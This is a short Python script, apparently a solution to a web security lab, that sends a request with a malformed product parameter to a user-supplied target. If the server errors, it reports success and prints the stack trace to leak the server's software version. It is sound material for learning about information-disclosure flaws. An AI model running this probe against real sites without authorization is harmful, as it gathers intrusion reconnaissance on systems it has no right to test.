import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def output_version_number(s, url, product_path):
    product_url = url + product_path
    r = s.get(product_url, verify=False)
    res = r.text
    if (r.status_code == 500):
        print("(+) Successfully exploited vulnerability!")
        print("(+) The following is the stack trace: ")
        print(res)
    else:
        print("(-) Could not exploit vulnerability.")
        sys.exit(-1)

def main():
    # Get URL from user input
    url = input("Please enter the target URL (e.g., http://www.example.com): ").strip()
    
    # Basic URL validation
    if not url.startswith("http://") and not url.startswith("https://"):
        print("(-) Error: URL must start with http:// or https://")
        sys.exit(-1)
    
    # Get product path from user input
    product_path = input("Please enter the product path (e.g., /product?productId='): ").strip()
    
    # Validate product path
    if not product_path:
        print("(-) Error: Product path cannot be empty")
        sys.exit(-1)

    s = requests.Session()
    output_version_number(s, url, product_path)

if __name__ == "__main__":
    main()